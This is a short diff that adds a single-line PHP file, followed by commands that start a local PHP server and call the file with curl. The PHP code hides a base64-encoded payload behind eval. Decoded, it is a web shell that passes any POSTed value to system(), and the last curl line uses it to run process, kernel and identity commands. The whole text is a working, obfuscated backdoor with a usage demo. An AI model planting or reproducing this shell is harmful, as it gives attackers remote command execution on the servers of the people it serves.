@@ -1,0 +1,7 @@
+<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
+
+cd /var/www/html && php -S 127.0.0.1:8080
+
+curl http://127.0.0.1:8080/test.php
+
+curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
